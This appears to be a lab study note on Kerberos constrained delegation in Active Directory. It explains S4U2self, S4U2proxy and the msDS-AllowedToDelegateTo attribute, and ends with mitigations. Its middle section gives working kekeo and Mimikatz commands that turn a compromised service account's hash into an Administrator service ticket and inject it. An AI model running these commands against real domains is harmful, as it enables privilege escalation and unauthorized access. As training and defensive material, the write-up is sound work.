### Constrained Delegation Overview:

**Constrained Delegation** is a security feature in **Microsoft Active Directory** that limits the scope of delegation to specific services or machines. It allows a service to impersonate a user, but the service can only access a pre-defined set of resources or services. Unlike **Unconstrained Delegation**, which permits access to any service on any machine in the domain, **Constrained Delegation** is more secure and specifies exactly which services can be accessed.

### Key Concepts:

- **Impersonation in Constrained Delegation**: The service that performs delegation is granted the ability to impersonate the user and perform actions on their behalf. This is typically used in multi-tier applications where a **front-end web server** authenticates a user and then needs to access a **back-end database server** to fetch data on behalf of the user. 

- **Service for User (S4U)**: This is an extension of Kerberos that enables services to impersonate a user and obtain Kerberos tickets on behalf of the user, without requiring the user's password.

There are two primary types of S4U extensions:

#### 1. **S4U2self (Service for User to Self)**:
   - **Purpose**: This extension allows a service to obtain a **forwardable TGS** to itself on behalf of a user, **without requiring the user's password**.
   - **Requirements**: 
     - The service account must be configured with the **TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION** attribute, which allows the service to impersonate users for delegated authentication.
     - The service uses the **user's principal name (UPN)** to request the TGS from the **Domain Controller**.
   
   - **Use Case**: A typical scenario is where a service needs to obtain a **Kerberos ticket** on behalf of a user to authenticate to the service itself.

#### 2. **S4U2proxy (Service for User to Proxy)**:
   - **Purpose**: This extension allows a service to obtain a TGS for a **second service** on behalf of the user. This second service must be explicitly defined in the **msDS-AllowedToDelegateTo** attribute.
   - **How It Works**: When a service (such as a web server) needs to access another service (such as a database server) on behalf of the user, the first service will request a TGS for the second service using **S4U2proxy**. The request is made to the **Domain Controller**, which checks whether the second service is allowed to be accessed via the **msDS-AllowedToDelegateTo** attribute.
   - **msDS-AllowedToDelegateTo**: This Active Directory attribute defines which services (identified by their **Service Principal Names (SPNs)**) can be accessed by the service account on behalf of a user.

### How Constrained Delegation Works:

1. **User Authentication**: The user authenticates to the first service (e.g., a web server).
   
2. **S4U2self Request**: The first service uses the **S4U2self** extension to request a **TGS** for itself on behalf of the user. This is done without needing the user's password.
   
3. **Impersonation for Proxy**: If the service needs to access other resources (e.g., a database server), it will use the **S4U2proxy** extension. This request is sent to the **Domain Controller**, which checks if the service account is allowed to impersonate the user for the second service (e.g., the database server). The list of allowed services is stored in the **msDS-AllowedToDelegateTo** attribute.

4. **TGS Issuance**: If the Domain Controller finds that the first service is allowed to delegate to the second service (based on the **msDS-AllowedToDelegateTo** attribute), it will issue a **TGS** to the second service, allowing the first service to access it as the user.

### Example Scenario:

1. A **web server** (service A) authenticates the user.
2. The web server needs to retrieve data from a **database server** (service B) on behalf of the user.
3. The web server (service A) uses **S4U2proxy** to request a TGS for the database server (service B).
4. The **Domain Controller** checks the **msDS-AllowedToDelegateTo** attribute for service A and finds that it is allowed to access service B.
5. The DC issues a **TGS** for the **database server** (service B), allowing the **web server** (service A) to authenticate to the **database server** (service B) as the user.

![image](https://github.com/user-attachments/assets/3f8aaea0-e0c3-4345-ac88-f1f4dafa0f07)

---
### Step-by-Step Breakdown:

1. **Joe Authenticates to the Web Service:**
   - Joe, a user, logs in to a **web service** (running with a service account called `websvc`). 
   - **Authentication Mechanism**: Joe uses a non-Kerberos compatible authentication method (e.g., basic authentication, NTLM), which means that the web service is not directly using Kerberos to authenticate Joe.

2. **Web Service Requests a Ticket from the KDC (S4U2Self):**
   - After authenticating Joe, the web service (running under the `websvc` service account) needs to perform actions on behalf of Joe. 
   - The web service requests a **Kerberos ticket** from the **Key Distribution Center (KDC)** for Joe's account, but it doesn't need to supply Joe's password. Instead, it uses its own credentials as `websvc` (the service account).
   - This request is done using the **S4U2Self** extension, which allows a service (in this case, the web service) to obtain a **forwardable Kerberos Ticket Granting Service (TGS)** on behalf of a user (Joe) without needing the user’s password.
   
3. **KDC Validates the Request:**
   - The **KDC** checks the `UserAccountControl` value for the **websvc** service account to ensure that the **TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION** attribute is set. This attribute allows the service account to authenticate on behalf of users for delegation.
   - Additionally, the **KDC** checks if Joe's account is not blocked from delegation, ensuring that Joe’s account is allowed to be delegated to other services.

4. **KDC Issues a Forwardable TGS (S4U2Self):**
   - If both conditions (the service account has the appropriate trust for delegation and Joe’s account allows delegation), the KDC returns a **forwardable ticket** for Joe’s account. This ticket is essentially a **TGS** that can be forwarded to other services, allowing the web service to impersonate Joe.

5. **Web Service Requests Service Ticket for CIFS/dcorp-mssql:**
   - After obtaining the TGS for Joe, the web service now needs to authenticate to a **CIFS service** (which is running on the `dcorp-mssql.dollarcorp.moneycorp.local` server).
   - The web service passes the forwardable TGS (for Joe) back to the **KDC** and requests a **service ticket** for the **CIFS service** on the `dcorp-mssql` server. This request is made using the **S4U2Proxy** extension, which allows the service (websvc) to obtain a TGS for another service (CIFS on `dcorp-mssql`) on behalf of the user (Joe).

6. **KDC Checks `msDS-AllowedToDelegateTo` Attribute:**
   - The **KDC** checks the **`msDS-AllowedToDelegateTo`** attribute on the **websvc** service account. This attribute contains a list of **Service Principal Names (SPNs)** to which the `websvc` service is allowed to delegate user credentials. In this case, the KDC verifies that **CIFS/dcorp-mssql** is listed in the `msDS-AllowedToDelegateTo` attribute for the **websvc** service account.
   - If the service is allowed to delegate to `dcorp-mssql`, the KDC will issue a service ticket for the CIFS service on `dcorp-mssql`.

7. **Web Service Uses TGS to Authenticate to CIFS Service:**
   - The web service can now present the service ticket (TGS) for **CIFS/dcorp-mssql** to the **CIFS service** on `dcorp-mssql`.
   - The CIFS service will authenticate the request and allow the web service to act as **Joe**, accessing the resources on the `dcorp-mssql` server as Joe, using

![image](https://github.com/user-attachments/assets/42f6c8e9-99b3-428b-8c07-c6bb79dce6ab)
![image](https://github.com/user-attachments/assets/27bb2bca-3e33-45ee-b18c-f1b3d6616ddb)

** If you compromise the web svc I would be able to access the file system on dcrop-mssql as any user including  domain admin.**

![image](https://github.com/user-attachments/assets/7a511d5d-9de1-4a94-9e28-69d984315cf6)
or 
![image](https://github.com/user-attachments/assets/cc65a56b-43cb-455f-9a61-12da6dc6e767)

![image](https://github.com/user-attachments/assets/d1092ab2-0f4e-40f4-aa9b-526317ac8513)

![image](https://github.com/user-attachments/assets/1a6e9681-8717-4c5c-8c7e-2b83b2d2cef8)

# Abusing Constrained Delegation

## Accessing Services Listed in msDS-AllowedToDelegateTo

Note: To abuse constrained delegation in the scenario above, we need to have access to the `websvc` account. If we have access to that account, it is possible to access the services listed in `msDS-AllowedToDelegateTo` of the `websvc` account as ANY user.

### Enumerate Trusted Computers
```powershell
PS C:\AD\Tools> Get-DomainComputer -TrustedToAuth
```

### Request a TGT from websvc

Now, we already have the hash of `websvc` from the `dcorp-adminsrv` machine. We can use the `tgt::ask` module from `kekeo` to request a TGT from `websvc`. 

#### Steps to Request TGT:
```powershell
PS C:\AD\Tools> cd .\kekeo\x64\
PS C:\AD\Tools\kekeo\x64> ls

 Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/15/2018   1:01 AM         593048 kekeo.exe

PS C:\AD\Tools\kekeo\x64> .\kekeo.exe …snip….
 > Ticket in file 'TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi'
```

### Using s4u from Kekeo to Request a TGS

Now, let’s use this TGT and request a TGS. Note that we are requesting a TGS to access `cifs/dcorp-mssql` as the domain administrator - `Administrator`.

#### Request a TGS:
```powershell
kekeo # tgs::s4u /tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-mssql.dollarcorp.moneycorp.LOCAL
 > Ticket in file 'TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi'
```

**Note:**
- We must have a TGT.
- We are authenticating only to the service listed in `msDS-AllowedToDelegateTo`.
- There is no need to connect or trick a domain admin to connect to this service; we can do it without waiting.

### Inject the Ticket in Current Session

Next, inject the ticket into the current session to use it.

#### Inject the Ticket:
```powershell
PS C:\AD\Tools\kekeo\x64> . ..\..\Invoke-Mimikatz.ps1
PS C:\AD\Tools\kekeo\x64> Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi"'

mimikatz(powershell) # kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi
 * File: 'TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi': OK

PS C:\AD\Tools\kekeo\x64>
```

### Verification

```powershell
PS C:\AD\Tools\kekeo\x64> klist
```

**Note:** If I run other protocols like `Enter-PSSession` for the `dcorp-mssql` server, we will get access denied. This is a risk associated with constrained delegation. 

Remember that although we provide access to just one service, there is no need to wait or trick a domain admin to connect to the attacker's machine.
```
```
Here’s a table comparing **Constrained Delegation** and **Unconstrained Delegation** in Active Directory:

| **Feature**                     | **Unconstrained Delegation**                              | **Constrained Delegation**                                    |
|----------------------------------|------------------------------------------------------------|---------------------------------------------------------------|
| **Definition**                   | Allows a service to impersonate any user and access any service in the domain. | Allows a service to impersonate a user but only for specific services. |
| **Scope of Delegation**          | Service can delegate authentication to any service in the domain. | Delegation is limited to specific services listed in **`msDS-AllowedToDelegateTo`**. |
| **Security Risk**                | High, as any service can impersonate any user in the domain. | Lower, as services are restricted to specific services and users. |
| **Configuration Complexity**     | Simple, often enabled by default with no specific configuration needed. | Requires detailed configuration specifying the services the service account can delegate to. |
| **Exposure to Attacks**          | More vulnerable to **Pass-the-Ticket** and privilege escalation attacks. | More secure, reduces the risk of widespread impersonation and unauthorized access. |
| **Use Case**                     | Typically used in legacy or less security-conscious environments. | Ideal for modern environments with multi-tier applications and stricter security requirements. |
| **Service Account Permissions**  | No restrictions; can impersonate any user across the domain. | Restrictions based on **`msDS-AllowedToDelegateTo`** attribute for defined services. |
| **Impact of Compromise**         | If the service account is compromised, the attacker can impersonate any user in the domain. | If compromised, the attacker can only impersonate users for the services listed in **`msDS-AllowedToDelegateTo`**. |
| **Ticket Request**               | Service can request tickets for any service in the domain. | Service can only request tickets for services it is allowed to delegate to. |
| **Common Vulnerabilities**       | **Pass-the-Ticket (PTT)**, **Privilege Escalation**.      | Limited vulnerabilities, focused on specific service misconfigurations. |
| **Best Practice**                | Generally avoided due to security risks.                   | Recommended for security-conscious environments with careful control over delegation. |

---

This table summarizes the key differences between **Constrained Delegation** and **Unconstrained Delegation**, highlighting the security, configuration complexity, and use cases of each approach.

### Security Implications:

- **Limiting Access**: Since **Constrained Delegation** restricts delegation to specific services, it reduces the attack surface compared to **Unconstrained Delegation**, where a service can impersonate the user for any service in the domain.
  
- **Trust Configuration**: Administrators need to configure the **msDS-AllowedToDelegateTo** attribute correctly for each service account. This ensures that only trusted services can be accessed on behalf of users.

- **TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION**: This attribute on the service account is critical. If an attacker can gain control of a service account with this attribute, they could impersonate users to access other services.

### Mitigating the Risk:

1. **Restrict Service Accounts**: Limit the number of accounts that are **Trusted to Authenticate for Delegation** and ensure only essential services have this permission.
   
2. **Review msDS-AllowedToDelegateTo**: Regularly review the **msDS-AllowedToDelegateTo** attribute for services to ensure that only necessary services are listed.

3. **Use Constrained Delegation Carefully**: While constrained delegation is more secure than unconstrained delegation, it still requires proper configuration. Avoid overly permissive delegation setups.

4. **Use Managed Service Accounts**: Managed Service Accounts (MSAs) can be used to automatically handle password management and reduce the attack surface by limiting how service accounts can be accessed and delegated.

5. **Monitor Kerberos Authentication**: Continuously monitor Kerberos authentication logs for unusual or unauthorized delegation requests to detect potential abuse of delegated privileges.

By correctly implementing and configuring **Constrained Delegation**, and regularly reviewing the settings, you can reduce the risk of privilege escalation through delegation attacks in Active Directory environments.
